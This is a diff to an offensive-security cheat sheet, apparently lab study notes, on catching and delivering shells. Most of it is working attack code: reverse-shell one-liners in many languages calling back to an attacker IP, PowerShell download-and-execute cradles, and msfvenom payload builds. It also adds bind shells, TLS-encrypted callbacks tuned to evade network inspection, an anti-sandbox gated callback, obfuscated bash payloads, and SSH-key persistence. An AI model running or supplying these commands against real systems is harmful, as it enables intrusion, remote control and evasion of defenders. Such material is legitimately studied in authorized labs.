@@ -40,10 +40,10 @@ Generate, deliver, and catch shells for initial access or post-exploitation comm
 ### Netcat
 
 ```bash
-nc -lvnp 4444
+nc -lvnp 9001
 
 # rlwrap for arrow keys / history (Windows shells)
-rlwrap nc -lvnp 4444
+rlwrap nc -lvnp 9001
 ```
 
 ### pwncat-cs (best for Linux — auto upgrades TTY)
@@ -52,10 +52,10 @@ rlwrap nc -lvnp 4444
 pip install pwncat-cs
 
 # Listen
-pwncat-cs -lp 4444
+pwncat-cs -lp 9001
 
 # Connect to bind shell
-pwncat-cs <target-ip> 4444
+pwncat-cs <target-ip> 9001
 ```
 
 ### Metasploit multi/handler
@@ -65,7 +65,7 @@ msfconsole -q
 use exploit/multi/handler
 set PAYLOAD linux/x64/shell_reverse_tcp    # match your payload
 set LHOST tun0
-set LPORT 4444
+set LPORT 9001
 set ExitOnSession false
 run -j    # run as background job, handle multiple sessions
 ```
@@ -93,15 +93,15 @@ $(bash -c 'bash -i >& /dev/tcp/10.10.14.x/9002 0>&1')
 ### Python
 
 ```bash
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 
-python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 **PTY variant — fully interactive on connect** (use `pty.spawn` instead of `subprocess.call`, so you land in a real TTY with job control, `sudo`, `su`, tab-completion — no separate [TTY upgrade](#tty-upgrade-linux) step):
 
 ```bash
-python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.x",1337));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.x",9001));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
 ```
 
 > [!tip] Prefer the PTY variant when you can — `pty.spawn` allocates a pseudo-terminal at connect time, so the shell isn't the "dumb" pipe you get from `subprocess.call` (which hangs on `sudo`/`ssh`/`vi` and has no Ctrl-C). Still finish the upgrade with `stty raw -echo; fg` locally for full arrow-key/resize behavior — see [TTY Upgrade](#tty-upgrade-linux). When injecting through a shell that quotes aggressively (e.g. RCE via `subprocess.run(shell=True)`), the `[os.dup2(...) for f in(0,1,2)]` list-comprehension form avoids the semicolons/`for` loop that some quoting mangles.
@@ -109,39 +109,39 @@ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.x",1337)
 ### Perl
 
 ```bash
-perl -e 'use Socket;$i="10.10.14.x";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -e 'use Socket;$i="10.10.14.x";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
 ### Ruby
 
 ```bash
-ruby -rsocket -e'f=TCPSocket.open("10.10.14.x",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+ruby -rsocket -e'f=TCPSocket.open("10.10.14.x",9001).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
 ### PHP (CLI)
 
 ```bash
-php -r '$sock=fsockopen("10.10.14.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.10.14.x",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 ### Netcat variants
 
 ```bash
 # Standard (if -e is available)
-nc -e /bin/sh 10.10.14.x 4444
+nc -e /bin/sh 10.10.14.x 9001
 
 # mkfifo (when -e not available)
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.x 4444 >/tmp/f
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.x 9001 >/tmp/f
 ```
 
 ### Socat (fully interactive — best option)
 
 ```bash
 # Attacker listener (fully interactive)
-socat file:`tty`,raw,echo=0 tcp-listen:4444
+socat file:`tty`,raw,echo=0 tcp-listen:9001
 
 # Victim
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.x:4444
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.x:9001
 ```
 
 ### AWK / Find / misc
@@ -163,7 +163,7 @@ vim -c ':!/bin/sh'
 powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x/shell.ps1')"
 
 # One-liner (no download)
-powershell -nop -noni -w hidden -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.x',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -nop -noni -w hidden -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.x',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 # Base64 encoded (bypass argument restrictions)
 $cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.x/shell.ps1")'
@@ -178,7 +178,7 @@ powershell -ep bypass -enc <BASE64>
 # On attacker — serve Invoke-PowerShellTcp.ps1
 cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
 # Add to end of file:
-Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.x -Port 4444
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.x -Port 9001
 
 # On victim
 IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x/Invoke-PowerShellTcp.ps1')
@@ -188,7 +188,7 @@ IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x/Invoke-PowerShel
 
 ```cmd
 # Using nc.exe (upload first)
-nc.exe -e cmd.exe 10.10.14.x 4444
+nc.exe -e cmd.exe 10.10.14.x 9001
 
 # Using PowerShell to download and execute
 cmd /c powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x/shell.ps1')"
@@ -200,11 +200,121 @@ Use [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) for a fully intera
 
 ```powershell
 # Attacker
-stty raw -echo; (stty size; cat) | nc -lvnp 4444
+stty raw -echo; (stty size; cat) | nc -lvnp 9001
 
 # Victim
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.x 4444
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.x 9001
 ```
+
+---
+
+## Bind Shells & Encrypted Callbacks
+
+The reverse shells above all assume the target can reach **you** on your chosen port. On a hardened target that assumption is often wrong — egress is firewalled, or a network sensor flags cleartext `sh` on the wire. Test egress *before* you burn the RCE, and switch to a bind shell or an encrypted callback when the plain reverse shell won't land.
+
+### Egress testing — before you spend the RCE
+
+A single-shot RCE is expensive. Confirm which outbound port actually reaches you first, so the shell you fire lands on the first try. From the target's dumb shell:
+
+```bash
+# Bash /dev/tcp — probe a port on YOUR box, no tools needed on target.
+# Run a listener on the attacker first: nc -lvnp 443
+timeout 3 bash -c 'echo > /dev/tcp/10.10.14.x/443' && echo "443 OPEN" || echo "443 blocked"
+
+# Sweep the ports worth trying (443/53/80 usually punch through egress ACLs)
+for p in 443 53 80 8443 9001; do
+  timeout 2 bash -c "echo > /dev/tcp/10.10.14.x/$p" 2>/dev/null \
+    && echo "$p OPEN" || echo "$p blocked"
+done
+```
+
+> [!note] `/dev/tcp` is a **bash** builtin — it does not exist in `dash`/`sh`/`ash` (`cannot create /dev/tcp/... : Directory nonexistent`). Wrap each probe in `timeout` or a blocked port hangs the loop. If bash isn't present, fall back to `nc -zv 10.10.14.x 443` or a one-off `curl`/`wget` to a listener.
+
+If **no** outbound port reaches you (strict egress, NAT with no inbound, air-gapped segment), stop trying reverse shells — pivot to a **bind shell**: the target listens, you connect *in*.
+
+---
+
+### Bind shells — target listens, you connect in
+
+```bash
+# --- Victim listens ---
+# netcat with -e (netcat-traditional / nc.exe; OpenBSD nc has NO -e)
+nc -lvnp 9001 -e /bin/bash
+
+# mkfifo fallback when -e is unavailable (OpenBSD nc, busybox)
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 9001 > /tmp/f
+
+# socat bind (upgradeable to full PTY — see TTY Upgrade below)
+socat TCP-LISTEN:9001,reuseaddr,fork EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane
+```
+
+```bash
+# --- Attacker connects in ---
+nc -v <target-ip> 9001
+socat FILE:`tty`,raw,echo=0 TCP:<target-ip>:9001    # interactive against the socat bind
+```
+
+For a Windows bind listener without a shell one-liner, generate one with msfvenom (verified payload name — `windows/x64/shell_bind_tcp`, options `LPORT`/optional `RHOST`):
+
+```bash
+msfvenom -p windows/x64/shell_bind_tcp LPORT=9001 -f exe -o bind.exe
+# run bind.exe on the target, then from the attacker:
+nc -v <target-ip> 9001         # or: msfconsole → use exploit/multi/handler
+#                                        set payload windows/x64/shell_bind_tcp; set RHOST <target>
+```
+
+> [!warning] A bind shell needs the target's **inbound** port open. If a host firewall drops unsolicited inbound (default on modern Windows), the bind port is unreachable from off-host — a bind shell only helps when you've already got a foothold on the same segment, or the listen port rides a rule that's already open. Bind ports are also trivially found by anyone else scanning the box; kill the listener when you're done.
+
+---
+
+### Encrypted callbacks — TLS-wrapped shells
+
+Cleartext `sh` over TCP is what IDS/NSM signatures are tuned for (`id`, `uid=`, `/bin/sh` prompts in the clear). Wrapping the channel in TLS defeats content inspection and looks like ordinary HTTPS on the wire. Two ways, both on default Kali.
+
+**socat + OpenSSL.** Make a throwaway self-signed cert, then listen with `OPENSSL-LISTEN` / connect with `OPENSSL`. `verify=0` is what lets the peer accept the self-signed cert (leaving it out fails the handshake):
+
+```bash
+# Attacker: one-time throwaway cert (CN can mimic a benign host to blend in)
+openssl req -newkey rsa:2048 -nodes -x509 -days 30 \
+  -subj '/CN=cdn.example.com' -keyout shell.key -out shell.crt
+cat shell.key shell.crt > shell.pem        # socat wants key+cert in one file
+
+# Attacker listener (TLS server holds the cert)
+socat FILE:`tty`,raw,echo=0 OPENSSL-LISTEN:9001,cert=shell.pem,verify=0,fork
+
+# Victim connects back over TLS (fully interactive PTY)
+socat OPENSSL:10.10.14.x:9001,verify=0 EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane
+```
+
+Or flip it into an **encrypted bind shell** — target is the TLS server, you dial in:
+
+```bash
+# Victim listens (needs the cert on the target)
+socat OPENSSL-LISTEN:9001,cert=shell.pem,verify=0,fork EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane
+# Attacker connects in
+socat FILE:`tty`,raw,echo=0 OPENSSL:<target-ip>:9001,verify=0
+```
+
+**ncat --ssl** (ships with nmap; simplest option). In listen mode `--ssl` **auto-generates** a temporary 2048-bit cert, so there's nothing to create:
+
+```bash
+# Attacker listener — cert generated automatically
+ncat --ssl -lvnp 9001
+
+# Victim callback (-e execs the shell over the TLS channel)
+ncat --ssl -e /bin/bash 10.10.14.x 9001         # Linux
+ncat --ssl -e cmd.exe   10.10.14.x 9001         # Windows (ncat.exe uploaded)
+```
+
+If the target has **only stock OpenSSL** (no socat/ncat), you can still bring up a TLS shell against a `socat OPENSSL-LISTEN` / `ncat --ssl` listener with a fifo + `openssl s_client`:
+
+```bash
+# Victim — verified working against a socat OPENSSL-LISTEN catcher
+rm -f /tmp/s; mkfifo /tmp/s
+/bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.x:9001 > /tmp/s
+```
+
+> [!tip] TLS hides the *content*, not the *connection*. The flow still shows up in NetFlow/Zeek as a session to your IP on an odd port, and a self-signed cert with a random CN is itself an anomaly to a TLS-fingerprinting sensor (JA3/JA3S). Pick a plausible port (443) and CN, and treat encryption as raising the bar, not clearing it — same lesson as [[Techniques/AV & EDR Evasion|AV & EDR Evasion]] for payloads.
 
 ---
 
@@ -260,10 +370,10 @@ Then finish exactly like Method 1: `Ctrl+Z` → `stty raw -echo; fg` → `export
 
 ```bash
 # Attacker
-socat file:`tty`,raw,echo=0 tcp-listen:4444
+socat file:`tty`,raw,echo=0 tcp-listen:9001
 
 # Victim
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.x:4444
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.x:9001
 ```
 
 > [!tip] **Even better than a stabilized TTY: drop an SSH key.** A reverse shell — even a fully upgraded one — still dies when the connection drops. If the box runs SSH (22) and you can write a user's home, append your public key to their `~/.ssh/authorized_keys` and log back in over SSH: a stable, fully-interactive session with no password (public-key auth ignores the account password entirely), and free persistence. Do this the moment the shell is stable. Full steps: [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc#Stabilize First — Drop an SSH Key (no password needed)|Linux Priv Esc → Drop an SSH Key]].
@@ -395,7 +505,7 @@ sandbox=0
 # Very low uptime = fresh sandbox detonation
 [ $(awk '{print int($1)}' /proc/uptime) -lt 300 ] && sandbox=1
 
-[ $sandbox -eq 0 ] && bash -i >& /dev/tcp/10.10.14.x/4444 0>&1
+[ $sandbox -eq 0 ] && bash -i >& /dev/tcp/10.10.14.x/9001 0>&1
 ```
 
 > [!note] Anti-sandbox checks matter most when using staged payloads against hardened targets where burning a C2 domain or IP is costly. For HTB labs, skip these — sandboxing isn't a factor.
@@ -404,54 +514,62 @@ sandbox=0
 
 ```bash
 # Linux ELF
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f elf -o shell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f elf -o shell.elf
 
 # Windows EXE
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f exe -o shell.exe
 
 # Windows Meterpreter EXE
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.x LPORT=4444 -f exe -o meter.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.x LPORT=9001 -f exe -o meter.exe
 
 # PHP webshell
-msfvenom -p php/reverse_php LHOST=10.10.14.x LPORT=4444 -f raw -o shell.php
+msfvenom -p php/reverse_php LHOST=10.10.14.x LPORT=9001 -f raw -o shell.php
 
 # ASP
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f asp -o shell.asp
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f asp -o shell.asp
 
 # ASPX
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f aspx -o shell.aspx
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f aspx -o shell.aspx
 
 # JSP
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f raw -o shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f raw -o shell.jsp
 
 # WAR (Tomcat)
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f war -o shell.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f war -o shell.war
 
 # PowerShell
-msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f raw -o shell.ps1
+msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f raw -o shell.ps1
 
 # Python
-msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.x LPORT=4444 -f raw -o shell.py
+msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.x LPORT=9001 -f raw -o shell.py
 
 # DLL (for DLL hijacking)
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f dll -o shell.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f dll -o shell.dll
 
 # Shellcode (for injection)
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f c
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f c
 ```
 
-### Encoding (basic AV evasion)
+### Encoding — what it is actually for
 
 ```bash
 # Single encode
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -e x64/xor -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -e x64/xor -f exe -o shell.exe
 
 # Iteration
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -e x64/xor -i 10 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -e x64/xor -i 10 -f exe -o shell.exe
 
 # List encoders
 msfvenom -l encoders
+
+# Bad-character avoidance — the real modern use case
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 \
+  -b '\x00\x0a\x0d' -f c
 ```
+
+> [!warning] **Encoding is not AV evasion — treat it as bad-character removal.** `x86/shikata_ga_nai` earned its "excellent" rank in an era of pure static signatures; today the **decoder stub itself is signatured**, so an encoded payload is often flagged *because* it is encoded, and `-i 10` just stacks more known stub. Nothing here defeats behavioural detection or an EDR that watches the unpacked shellcode in memory.
+>
+> Where `-e`/`-b` still genuinely earns its place is **exploit development** — stripping bytes (`\x00`, `\x0a`, `\x0d`) that would terminate a string copy or break the vulnerable parser before your shellcode ever runs. For real evasion see [[Techniques/AV & EDR Evasion|AV & EDR Evasion]].
 
 ---
 
@@ -461,7 +579,7 @@ msfvenom -l encoders
 
 ```bash
 python3 -m http.server 80
-python3 -m http.server 8080
+python3 -m http.server 8001
 ```
 
 ### Linux download methods
@@ -510,7 +628,7 @@ copy \\10.10.14.x\share\shell.exe C:\Windows\Temp\shell.exe
 ### Base64 encode bash payload
 
 ```bash
-echo 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1' | base64
+echo 'bash -i >& /dev/tcp/10.10.14.x/9001 0>&1' | base64
 # Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC54LzQ0NDQgMD4mMQo=
 
 bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC54LzQ0NDQgMD4mMQo=}|{base64,-d}|bash"
@@ -544,7 +662,7 @@ X=$'\t';env${X}-i${X}id            # tab as the separator
 ### Variable substitution
 
 ```bash
-c=bas;h=h;$c$h -i >& /dev/tcp/10.10.14.x/4444 0>&1
+c=bas;h=h;$c$h -i >& /dev/tcp/10.10.14.x/9001 0>&1
 ```
 
 ---
@@ -552,10 +670,15 @@ c=bas;h=h;$c$h -i >& /dev/tcp/10.10.14.x/4444 0>&1
 ## Quick Reference Checklist
 
 ```bash
+0. Test egress first (don't waste a one-shot RCE)
+   - timeout 3 bash -c 'echo > /dev/tcp/10.10.14.x/443' && echo OPEN
+   - no outbound? → bind shell (target listens, you connect in)
+   - cleartext flagged? → TLS: socat OPENSSL-LISTEN / ncat --ssl
+
 1. Set up listener
-   - Linux target: nc -lvnp 4444
-   - Linux target (better): pwncat-cs -lp 4444
-   - Windows target: rlwrap nc -lvnp 4444
+   - Linux target: nc -lvnp 9001
+   - Linux target (better): pwncat-cs -lp 9001
+   - Windows target: rlwrap nc -lvnp 9001
    - Meterpreter: msf multi/handler
 
 2. Generate/choose shell
@@ -589,5 +712,5 @@ c=bas;h=h;$c$h -i >& /dev/tcp/10.10.14.x/4444 0>&1
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-09-02*
-*Model: claude-opus-5*
+*Updated: 2026-09-18*
+*Model: claude-opus-4-8*
